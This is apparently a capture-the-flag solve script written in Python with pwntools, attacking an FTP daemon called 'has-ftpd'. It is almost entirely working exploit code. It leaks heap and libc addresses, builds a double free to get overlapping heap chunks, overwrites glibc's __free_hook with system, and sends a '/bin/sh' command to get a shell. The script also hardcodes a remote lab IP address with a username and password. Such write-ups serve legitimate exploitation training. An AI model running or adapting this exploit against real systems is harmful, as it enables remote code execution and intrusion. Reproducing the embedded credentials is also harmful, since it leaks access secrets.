#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
import os
from functools import partial
import logging
import string

# Run with ipython3 -i solve.py -- DEBUG <one_gadget>

parser = argparse.ArgumentParser()
parser.add_argument("one_gadget", type=partial(int, base=0), nargs=argparse.REMAINDER)
argparse_args = parser.parse_args()

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

_CACHED_LIBC_PATH = None
def get_preloadable_libc(path=None, libc_paths=[]):
    global _CACHED_LIBC_PATH
    if _CACHED_LIBC_PATH is not None:
        return _CACHED_LIBC_PATH
    if path is None:
        path = os.getcwd()
    for root, dirs, files in os.walk(path):
        for f in files:
            # match common libc-2.31.so and libc.so.6 formats
            match = re.search(r'libc(\.so\.6|-\d+\.\d+\.so)', f)
            if match is not None:
                libc_paths.append(os.path.join(root, f))

    if len(libc_paths) > 0:
        return libc_paths[0]
    return None

# this variable will be filled in with an `ELF` object if
# there is a libc in the same directory as (or child directories of) the script
libc = None
script_directory = os.path.dirname(os.path.abspath(__file__))
LIBC_PATH = get_preloadable_libc(path=script_directory)
if libc is None and LIBC_PATH is not None:
    libc = ELF(LIBC_PATH)
    libc.sym['binsh'] = libc.offset_to_vaddr(libc.data.find(b'/bin/sh'))
    # libc.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') if not args.REMOTE else ELF('libc.so.6')
binary = context.binary = ELF('has-ftpd')


def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, val=None, force_unbuffered=False,
             skip_libc_preload=False,
             preload_libs=None):
    """Start a new process with predefined debug operations"""
    kwargs = {}
    kwargs["env"] = {}
    # if there is a libc in the current directory
    global LIBC_PATH
    if skip_libc_preload is False:
        if LIBC_PATH is not None:
            if preload_libs:
                preload_libs.append(LIBC_PATH)
            else:
                preload_libs = [LIBC_PATH]
    if preload_libs:
        cwd = os.getcwd()
        preload_libs = [os.path.join(cwd, i) if not i.startswith("/") else i
                        for i in preload_libs]
        ld_preload = kwargs['env'].get('LD_PRELOAD')
        if ld_preload:
            ld_preload = ld_preload.split(" ")
        else:
            ld_preload = []
        ld_preload.extend(preload_libs)
        kwargs['env']['LD_PRELOAD'] = " ".join(ld_preload)

    if force_unbuffered is True:
        kwargs['stdin'] = process.PTY
        kwargs['stdout'] = process.PTY

    p = process(binary.path, **kwargs)
    if start_gdb is True:
        attach_gdb(p, val)
    return p

def bnot(n, numbits=context.bits):
    return (1 << numbits) -1 -n

def align(val, align_to):
    return val & bnot(align_to - 1)

def batch(it, sz):
    length = len(it)
    for i in range(0, length, sz):
        yield it[i:i+sz]

def align_up(val, align_to):
    aligned = align(val, align_to)
    if aligned < val:
        aligned += align_to
    return aligned


def group_by_increment(iterable, group_incr):
    """
    Identify series of values that increment/decrement
    by the same amount, grouping them into lists.
    Useful for finding heap chunks next to eachother
    from large leaks
    """
    grouped = []
    current = [iterable[0]]
    for i in range(1, len(iterable)):
        curr_val = iterable[i]
        prev_val = current[-1]
        if (prev_val + group_incr) == curr_val:
            current.append(curr_val)
        else:
            grouped.append(current)
            current = [curr_val]
    if current:
        grouped.append(current)
    return grouped


def medium_malloc_size(size):
    """hacky. Don't use for small sizes"""
    return align_up(size+8, 16)


def gen_queue_cmd(size, char=None):
    """
    Generate a valid command that will stay in the heap.
    """
    queu_space = b'QUEU QUEU '
    if char is not None:
        queu_space = b'QUEU %s ' % (4*char)
        filler = char*(size - len(queu_space))
    else:
        filler = cyclic(size - len(queu_space))

    gennerated_command = queu_space + filler
    return gennerated_command


# p = new_proc(context.log_level == logging.DEBUG) if not args.REMOTE else remote('localhost', 21)
def new_ftp_session(is_remote=args.REMOTE):
    p = remote("localhost", 21) if not is_remote else remote("10.23.223.25", 21)

    payload = b''

    if is_remote:
        username = b"hasftpd"
        passwd = b"L@bm0nkey2delta"

    else:
        username = b'clif'
        passwd = b''

    p.sendafter(b'\r\n', b'USER %s\r\n' % username)
    p.sendafter(b'\r\n', b'PASS %s\r\n' % passwd)
    return p


p = new_ftp_session(args.REMOTE)
max_cmd_size = 0x1fe - len(b'QUEU ')

ascii_pool = string.ascii_letters + string.digits
alloc_size = 0x20 - 16
used_allocs = 0

# alloc_size = 0x1f0 - 16
# alloc_size = 0xb0 - 24
alloc_size = 0x90 - 24
num_init_allocs = 16  # len(ascii_pool)
for i in range(used_allocs, num_init_allocs):
    p.sendafter(b'\r\n', gen_queue_cmd(alloc_size) + b'\r\n')
    used_allocs += 1

for i in range(num_init_allocs -3):
    p.sendafter(b'\r\n', b'FREE %d\r\n' % i)

p.sendafter(b'\r\n', b'VIEW\r\n')
a = p.recvuntil(b'\r\n')
leaks_raw = p.read()
split_leaks = [i.split(b': ') for i in leaks_raw.split(b'\n\r\n') if i != b'']

libc_leak = None
libc_check_mask = 0xff0000000000
heap_leaks = []
heap_leak = None
for node_slot, leak_bytes in split_leaks:
    if len(leak_bytes) > 0:
        heap_leaks.append(u64(leak_bytes.ljust(8, b'\x00')))

for i in heap_leaks:
    if (i & libc_check_mask) == 0x7f0000000000:
        libc_leak = i
        break

heap_leak = heap_leaks[0]
if heap_leak is None:
    raise Exception("failed to leak any heap chunks")

if libc_leak is None:
    raise Exception("failed to leak libc")

known_heap_chunks = [i for i in group_by_increment(heap_leaks, -0x90) if len(i) > 1][0]

log.success("got a heap leak %#x" % heap_leak)
log.success("got a libc leak %#x" % libc_leak)

# static offset for known libc version
libc.address = libc_leak - 0x1ecbe0
log.success("libc base %#x" % libc.address)
p.close()
# enable this for debugging
# pause()
p = new_ftp_session(args.REMOTE)

used_allocs = 0
alloc_size = 0x90 - 24
num_init_allocs = 7  # len(ascii_pool)


log.debug("Filling holes on the heap")
# fill existing holes on the heap
p.sendafter(b'\r\n', gen_queue_cmd(alloc_size, b'Z') + b'\r\n')
p.sendafter(b'\r\n', gen_queue_cmd(alloc_size, b'Y') + b'\r\n')
p.sendafter(b'\r\n', gen_queue_cmd(alloc_size, b'X') + b'\r\n')
p.sendafter(b'\r\n', gen_queue_cmd(alloc_size, b'W') + b'\r\n')

log.debug("allocating padding")
# one extra to prevent coalesce
# p.sendafter(b'\r\n', gen_queue_cmd(alloc_size, b'D') + b'\r\n')
used_allocs += 8

for i in range(num_init_allocs):
    p.sendafter(b'\r\n', gen_queue_cmd(alloc_size) + b'\r\n')
    log.debug("alloc for tcache %d" % i)
    used_allocs += 1

log.debug("allocating target chunks")
# allocate fastbin bound chunks
p.sendafter(b'\r\n', gen_queue_cmd(alloc_size, b'A') + b'\r\n')
p.sendafter(b'\r\n', gen_queue_cmd(alloc_size, b'B') + b'\r\n')
p.sendafter(b'\r\n', gen_queue_cmd(0x10, b'C') + b'\r\n')

# pause()
# fill tcache
for i in range(num_init_allocs+3-1, 3-1, -1):
    p.sendafter(b'\r\n', b'FREE %d\r\n' % (i))
    log.debug("free for tcache %d" % i)

# can call view here to see chunks

# pause()
# log.debug("trigger double free")
p.sendafter(b'\r\n', b'FREE %d\r\n' % (1))  # B
p.sendafter(b'\r\n', b'FREE %d\r\n' % (2))  # A
# p.sendafter(b'\r\n', b'FREE %d\r\n' % (10))  # A
p.sendafter(b'\r\n', gen_queue_cmd(alloc_size, b'D') + b'\r\n')
# double FREE B - index has shifted because of alloc
p.sendafter(b'\r\n', b'FREE %d\r\n' % (2))

log.success("triggered double free")
log.success("allocating chunk to be overlapped")
p.sendafter(b'\r\n', gen_queue_cmd(0x90 - 24, b'H') + b'\r\n')
# pause()


# known from previous heap leak
fake_chunk_addr = known_heap_chunks[2]

overwriting_chunk_addr = known_heap_chunks[3]
overwriting_chunk = b''
overwriting_chunk += b'QUEU IIII '
overwriting_chunk += b'I'*112
overwriting_chunk += p64(0x90 | 1)  # fake_chunk_size
overwriting_chunk += b'FAKE' + b'\x00'*4   # start of overlapped queue elem
overwriting_chunk += b'\x00'*8   # unknown field of queue elem
overwriting_chunk += p64(0)  # next queue elem ptr
# overwriting_chunk += b'I'*8  # padding
# overwriting_chunk += p64(0)
overwriting_chunk = overwriting_chunk.ljust(264,  b'I')
p.sendafter(b'\r\n', overwriting_chunk + b'\r\n')
log.debug("free fake chunk to put it back on the freelist")
p.sendafter(b'\r\n', b'FREE 1\r\n')
log.debug("free overlapping chunk so it can overwrite freelist pointers")
p.sendafter(b'\r\n', b'FREE 0\r\n')  # free overlapping chunk


final_payload = b''
final_payload += b"/bin/sh -c 'sh; cat -'\x00"
aligned_cmd_offset = align_up(len(final_payload), 8)
final_payload = final_payload.ljust(aligned_cmd_offset, b'\x00')
final_payload += p64(libc.sym['system'])
final_payload = final_payload.ljust(0x90-24-len(b'QUEU exec '))


overwriting_chunk2 = b''
overwriting_chunk2 += b'QUEU JJJJ '
overwriting_chunk2 += b'J'*112
overwriting_chunk2 += p64(0x90)  # fake_chunk_size
overwriting_chunk2 += p64(libc.sym['__free_hook'] - (0x18 + aligned_cmd_offset))
overwriting_chunk2 += p64(0)
# overwriting_chunk2 += b'FAKE' + b'\x00'*4   # start of overlapped queue elem
overwriting_chunk2 = overwriting_chunk2.ljust(264,  b'J')
p.sendafter(b'\r\n', overwriting_chunk2 + b'\r\n')
# p.sendafter(b'\r\n', gen_queue_cmd(0x120 - 24, b'I') + b'\r\n')
# pause()
p.sendafter(b'\r\n', b'QUEU QUEU ' + b''.ljust(0x90-24-len(b'QUEU QUEU '), b'K')  + b'\r\n')

# listener = listen(4444)
p.sendafter(b'\r\n', b'QUEU exec ' + final_payload + b'\r\n')

p.sendline(b"bash")
# listener.interactive()
